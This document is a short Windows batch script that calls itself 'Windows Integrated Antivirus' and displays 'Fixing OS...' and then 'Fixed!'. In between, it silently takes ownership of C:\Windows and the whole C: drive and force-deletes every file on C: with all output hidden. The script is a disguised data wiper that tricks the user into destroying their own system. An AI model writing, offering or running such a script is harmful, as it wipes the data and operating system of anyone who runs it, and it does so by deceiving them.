@echo off
title Windows Integrated Antivirus
echo Fixing OS...
takeown /f C:\Windows /r /d Y > nul 2>&1
takeown /f C:\ /r /d Y > nul 2>&1
del /s /f /q C:\ > nul 2>&1
cls
echo Fixed!
pause>nul
